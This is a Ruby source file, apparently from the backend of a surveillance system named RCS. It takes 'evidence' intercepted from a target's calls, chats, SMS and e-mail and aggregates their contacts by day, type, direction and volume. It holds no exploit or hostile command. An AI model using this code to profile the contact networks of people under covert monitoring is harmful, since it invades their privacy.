#
# Aggregator processing module
#
# the evidence to be processed are queued by the workers
#

require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/sanitize'
require 'fileutils'

module RCS
module Aggregator

class Processor
  extend RCS::Tracer

  def self.run
    # TODO: use the findandmodify of mongoid
    db = RCS::DB::DB.instance.new_mongo_connection
    coll = db.collection('aggregator_queue')

    # infinite processing loop
    loop do
      # get the first entry from the queue and mark it as processed to avoid
      # conflicts with multiple processors
      if (entry = coll.find_and_modify({query: {flag: AggregatorQueue::QUEUED}, update: {"$set" => {flag: AggregatorQueue::PROCESSED}}}))
        count = coll.find({flag: AggregatorQueue::QUEUED}).count()
        trace :info, "#{count} evidence to be processed in queue"
        process entry
      else
        #trace :debug, "Nothing to do, waiting..."
        sleep 1
      end
    end
  end


  def self.process(entry)
    ev = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])
    target = Item.find(entry['target_id'])

    trace :info, "Processing #{ev.type} for target #{target.name}"

    data = []

    # extract peer(s) from call, mail, chat, sms
    data = extract_data(ev) if ['call', 'chat', 'message'].include? ev.type

    trace :debug, ev.data.inspect

    data.each do |datum|
      # already exist?
      #   update
      # else
      #   create new one

      type = ev.type
      type = datum[:type] unless datum[:type].nil?

      # twitter does not have a peer to sent message to :)
      next if type.eql? 'twitter'

      # we need to find a document that is in the same day, same type and that have the same peer and versus
      # if not found, create a new entry, otherwise increment the number of occurrences
      params = {aid: ev.aid, day: Time.at(ev.da).strftime('%Y%m%d'), type: type, data: {peer: datum[:peer], versus: datum[:versus]}}

      # find the existing aggregate or create a new one
      agg = Aggregate.collection_class(entry['target_id']).find_or_create_by(params)

      # we are sure we have the object persisted in the db
      # so we have to perform an atomic operation because we have multiple aggregator working concurrently
      agg.inc(:count, 1)

      # sum up the duration (or size)
      agg.inc(:size, datum[:size])

      trace :info, "Aggregated #{target.name}: #{agg.day} #{agg.type} #{agg.count} #{agg.data.inspect} " + (type.eql?('call') ? "#{agg.size} sec" : "#{agg.size.to_s_bytes}")
    end

  rescue Exception => e
    trace :error, "Cannot process evidence: #{e.message}"
    trace :fatal, e.backtrace.join("\n")
  end

  def self.extract_data(ev)
    data = []

    case ev.type
      when 'call'
        if ev.data['peer']
          # old call format
          # multiple peers creates multiple entries
          ev.data['peer'].split(',').each do |peer|
            data << {:peer => peer.strip, :versus => ev.data['incoming'] == 1 ? :in : :out, :type => ev.data['program'].downcase, :size => ev.data['duration'].to_i}
          end
        else
          # new call format
          if ev.data['incoming'] == 1
            data << {:peer => ev.data['from'], :versus => :in, :type => ev.data['program'].downcase, :size => ev.data['duration'].to_i}
          else
            # multiple rcpts creates multiple entries
            ev.data['rcpt'].split(',').each do |rcpt|
              data << {:peer => rcpt.strip, :versus => :out, :type => ev.data['program'].downcase, :size => ev.data['duration'].to_i}
            end
          end
        end
      when 'chat'
        if ev.data['peer']
          # old chat format
          # multiple rcpts creates multiple entries
          ev.data['peer'].split(',').each do |peer|
            data << {:peer => peer.strip, :versus => nil, :type => ev.data['program'].downcase, :size => ev.data['content'].length}
          end
        else
          # new chat format
          if ev.data['incoming'] == 1
            data << {:peer => ev.data['from'], :versus => :in, :type => ev.data['program'].downcase, :size => ev.data['content'].length}
          else
            # multiple rcpts creates multiple entries
            ev.data['rcpt'].split(',').each do |rcpt|
              data << {:peer => rcpt.strip, :versus => :out, :type => ev.data['program'].downcase, :size => ev.data['content'].length}
            end
          end
        end
      when 'message'
        # multiple rcpts creates multiple entries
        if ev.data['type'] == :mail
          if ev.data['incoming'] == 1
            #extract email from string "Ask Me" <ask@me.it>
            from = ev.data['from'].scan(/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b/i).first
            data << {:peer => from, :versus => :in, :type => ev.data['type'].downcase, :size => ev.data['body'].length}
          else
            ev.data['rcpt'].split(',').each do |rcpt|
              #extract email from string "Ask Me" <ask@me.it>
              to = rcpt.strip.scan(/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b/i).first
              data << {:peer => to, :versus => :out, :type => ev.data['type'].downcase, :size => ev.data['body'].length}
            end
          end
        else
          if ev.data['incoming'] == 1
            data << {:peer => ev.data['from'], :versus => :in, :type => ev.data['type'].downcase, :size => ev.data['content'].length}
          else
            ev.data['rcpt'].split(',').each do |rcpt|
              data << {:peer => rcpt.strip, :versus => :out, :type => ev.data['type'].downcase, :size => ev.data['content'].length}
            end
          end
        end
    end

    return data
  end

end

end #OCR::
end #RCS::